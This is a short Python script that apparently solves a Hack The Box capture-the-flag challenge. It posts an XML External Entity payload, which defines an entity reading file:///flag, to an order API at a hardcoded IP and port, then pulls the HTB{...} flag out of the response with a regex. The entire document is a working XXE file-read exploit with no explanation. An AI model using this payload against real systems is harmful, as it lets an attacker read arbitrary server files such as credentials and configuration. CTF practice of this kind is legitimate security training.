import requests
import re

host, port = "94.237.55.43", 54105
url_order = f"http://{host}:{port}/api/order"

payload = """<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY test SYSTEM 'file:///flag'>
]>
    <order>
        <food>&test;</food>
    </order>
"""

headers = {
    "Content-Type": "application/xml"
}

response = requests.post(url_order, data=payload, headers=headers)

flag = re.search(r'HTB\{.*?\}', response.text)

print(flag.group())